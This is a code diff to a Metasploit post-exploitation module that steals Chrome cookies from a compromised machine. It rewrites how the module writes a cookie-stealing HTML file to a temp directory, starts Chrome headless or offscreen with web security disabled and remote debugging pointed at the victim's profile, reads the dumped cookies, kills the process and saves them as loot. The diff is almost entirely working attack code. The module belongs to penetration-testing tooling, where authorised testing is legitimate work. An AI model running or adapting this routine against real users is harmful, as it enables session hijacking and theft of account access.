@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
-        OptString.new('TEMP_STORAGE_DIR', [true, 'Where to write the html used to steal cookies temporarily', '/tmp']),
+        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\Local\\Temp)', ""]),
         OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
       ]
     )
@@ -37,18 +37,21 @@ class MetasploitModule < Msf::Post
     when 'unix', 'linux', 'bsd', 'python'
       @platform = :unix
       @chrome = 'google-chrome'
-      @user_data_dir = "/home/#{session.username}/.config/google-chrome/"
-      @temp_storage_dir = datastore['TEMP_STORAGE_DIR']
+      @user_data_dir = "/home/#{session.username}/.config/google-chrome"
+      @temp_storage_dir = datastore['WRITABLE_DIR']
+      @temp_storage_dir = @temp_storage_dir.nil? ? "/tmp" : @temp_storage_dir
     when 'osx'
       @platform = :osx
       @chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
       @user_data_dir = expand_path "/Users/#{session.username}/Library/Application Support/Google/Chrome"
-      @temp_storage_dir = datastore['TEMP_STORAGE_DIR']
+      @temp_storage_dir = datastore['WRITABLE_DIR']
+      @temp_storage_dir = @temp_storage_dir.nil? ? "/tmp" : @temp_storage_dir
     when 'windows'
       @platform = :windows
       @chrome = '"\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"'
       @user_data_dir = "\\Users\\#{session.username}\\AppData\\Local\\Google\\Chrome\\User Data"
-      @temp_storage_dir = "\\Users\\#{session.username}\\AppData\\Local\\Temp"
+      @temp_storage_dir = datastore['WRITABLE_DIR']
+      @temp_storage_dir = @temp_storage_dir.nil? ? "\\Users\\#{session.username}\\AppData\\Local\\Temp" : @temp_storage_dir
     else
       fail_with Failure::NoTarget, "Unsupported platform: #{session.platform}"
     end
@@ -57,30 +60,50 @@ class MetasploitModule < Msf::Post
       @chrome = datastore['CHROME_BINARY_PATH']
     end
 
-    @retries = datastore['MAX_RETRIES']
+    # Warn user that we are leaving a running process behind.
+    if session.type != "meterpreter"
+      print_warning "Non-meterpreter session used - This module will leave a headless Chrome process running on the target machine."
+    end
 
-=begin
     unless writable? @temp_storage_dir
       fail_with Failure::BadConfig, "#{@temp_storage_dir} is not writable"
     end
-=end
 
     @html_storage_path = create_cookie_stealing_html
 
-    @chrome_debugging_cmd = "#{@chrome}"
+    @chrome_debugging_cmd = @chrome.to_s
+    @chrome_debugging_args = []
+
     if @platform == :windows
-      @chrome_debugging_args = '--enable-logging'
-      @chrome_debugging_args << ' --disable-gpu'
-      @chrome_debugging_args << ' --window-position=0,0'
+      # `--headless` doesn't work on Windows, so use an offscreen window instead.
+      @chrome_debugging_args << '--window-position=0,0'
+      @chrome_debugging_args << '--enable-logging --v=1'
     else
-      @chrome_debugging_args = '--headless'
+      @chrome_debugging_args << '--headless'
     end
 
-    @chrome_debugging_args << ' --disable-web-security'
-    @chrome_debugging_args << ' --disable-plugins'
+    chrome_debugging_args_all_platforms = [
+      '--disable-translate',
+      '--disable-extensions',
+      '--disable-background-networking',
+      '--safebrowsing-disable-auto-update',
+      '--disable-sync',
+      '--metrics-recording-only',
+      '--disable-default-apps',
+      '--mute-audio',
+      '--no-first-run',
+      '--disable-web-security',
+      '--disable-plugins',
+      '--disable-gpu'
+    ]
+
+    @chrome_debugging_args += chrome_debugging_args_all_platforms
+
     @chrome_debugging_args << " --user-data-dir=\"#{@user_data_dir}\""
     @chrome_debugging_args << " --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}"
     @chrome_debugging_args << " #{@html_storage_path}"
+
+    @chrome_debugging_args = @chrome_debugging_args.join(" ")
   end
 
   def create_cookie_stealing_html
@@ -120,32 +143,50 @@ class MetasploitModule < Msf::Post
     )
 
     # Where to temporarily store the cookie-stealing html
-    #html_storage_path = File.join @temp_storage_dir, Rex::Text.rand_text_alphanumeric(10..15)
     if @platform == :windows
       html_storage_path = "#{@temp_storage_dir}\\#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
     else
       html_storage_path = "#{@temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
     end
+
     write_file html_storage_path, cookie_stealing_html
+
     html_storage_path
   end
 
-  def cleanup_html
+  def cleanup
     rm_f @html_storage_path
+    rm_f @chrome_debug_log
   end
 
   def get_cookies
     if @platform == :windows
-      chrome_pid = cmd_exec_get_pid @chrome_debugging_cmd, @chrome_debugging_args
-      Rex::sleep(5)
+      # Write to the chrome debug log, since `--enable-logging` is incompatible with `--headless`.
+      chrome_cmd = "#{@chrome_debugging_cmd} #{@chrome_debugging_args}"
+      @chrome_debug_log = "#{@user_data_dir}\\chrome_debug.log"
+      kill_cmd = "taskkill /f /pid"
+      @cookie_storage_path = @chrome_debug_log
 
-      chrome_output = read_file("#{@user_data_dir}\\chrome_debug.log")
-      cmd_exec("taskkill /f /pid #{chrome_pid}")
     else
-      chrome_output = cmd_exec @chrome_debugging_cmd, @chrome_debugging_args
+      @cookie_storage_path = "#{@temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
+      chrome_cmd = "#{@chrome_debugging_cmd} #{@chrome_debugging_args} > #{@cookie_storage_path} 2>&1"
+      kill_cmd = "kill -9"
     end
 
-    print_status "Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd} #{@chrome_debugging_args}"
+    if session.type == "meterpreter"
+      chrome_pid = cmd_exec_get_pid chrome_cmd
+      print_status "Activated Chrome's Remote Debugging (pid: #{chrome_pid}) via #{chrome_cmd}"
+      Rex.sleep(5)
+
+      chrome_output = read_file @cookie_storage_path
+      kill_output = cmd_exec "#{kill_cmd} #{chrome_pid}"
+      print_status "Running #{kill_cmd}\
+      #{kill_output}"
+    else
+      chrome_output = cmd_exec chrome_cmd
+      print_status "Activated Chrome's Remote Debugging via #{chrome_cmd}"
+      print_warning "Leaving headless Chrome process running...."
+    end
 
     # Parse out the cookies from Chrome's output
     cookies_pattern = /REMOTE_DEBUGGING|\[.*\]/m
@@ -170,6 +211,6 @@ class MetasploitModule < Msf::Post
     cookies = get_cookies
     cookies_parsed = JSON.parse cookies
     save "#{cookies_parsed.length} Chrome Cookies", cookies
-    cleanup_html
+    cleanup
   end
 end
